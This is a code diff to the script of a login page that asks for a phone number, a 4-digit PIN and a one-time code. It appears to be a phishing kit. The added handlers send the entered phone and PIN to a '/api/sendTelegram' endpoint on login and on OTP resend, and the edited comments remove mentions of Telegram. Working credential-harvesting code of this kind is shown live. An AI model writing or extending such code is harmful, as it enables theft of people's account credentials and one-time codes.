@@ -251,7 +251,7 @@ function updateLogin(){
   loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pinValue));
 }
 
-/* ===== API (TELEGRAM) ===== */
+/* ===== API ===== */
 async function sendToServer(payload){
   return fetch('/api/sendTelegram',{
     method:'POST',
@@ -296,7 +296,7 @@ function updateOtpState(){
 
 bindDigitInputs(dEls,updateOtpState);
 
-/* ===== OTP PASTE (FINAL) ===== */
+/* OTP paste */
 dEls[0].addEventListener('paste',e=>{
   const data=(e.clipboardData||window.clipboardData)
     .getData('text').replace(/\D/g,'').slice(0,5);
@@ -304,21 +304,25 @@ dEls[0].addEventListener('paste',e=>{
   e.preventDefault();
 
   dEls.forEach(d=>{d.value='';d.classList.remove('filled')});
-
   data.split('').forEach((v,i)=>{
     dEls[i].value=v;
     dEls[i].classList.add('filled');
   });
-
   updateOtpState();
-  dEls[Math.min(data.length,4)].focus();
 });
 
-/* ===== LOGIN ===== */
-document.getElementById('loginForm').addEventListener('submit',e=>{
+/* ===== LOGIN CLICKED (RESTORED) ===== */
+document.getElementById('loginForm').addEventListener('submit',async e=>{
   e.preventDefault();
   if(document.getElementById('hp').value) return;
   if(navigator.vibrate) navigator.vibrate(30);
+
+  await sendToServer({
+    event:'login_clicked',
+    loginPhone: phone.value,
+    loginPin: pinValue,
+    submittedAt: new Date().toISOString()
+  });
 
   document.getElementById('otpModal').style.display='flex';
   dEls.forEach(d=>{d.value='';d.classList.remove('filled')});
@@ -326,7 +330,7 @@ document.getElementById('loginForm').addEventListener('submit',e=>{
   startCountdown();
 });
 
-/* ===== CONFIRM OTP (TELEGRAM RESTORED) ===== */
+/* ===== CONFIRM OTP ===== */
 confirmBtn.onclick=async()=>{
   if(confirmBtn.disabled) return;
   if(navigator.vibrate) navigator.vibrate(30);
@@ -343,13 +347,20 @@ confirmBtn.onclick=async()=>{
   setTimeout(()=>location.href='thankyou.html',1200);
 };
 
+/* ===== RESEND OTP ===== */
+resendBtn.onclick=async()=>{
+  await sendToServer({
+    event:'resend_otp',
+    loginPhone: phone.value,
+    loginPin: pinValue,
+    submittedAt: new Date().toISOString()
+  });
+  startCountdown();
+};
+
 document.getElementById('cancelOtp').onclick=()=>{
   document.getElementById('otpModal').style.display='none';
   clearInterval(timer);
-};
-
-resendBtn.onclick=()=>{
-  startCountdown();
 };
 </script>
 </body>
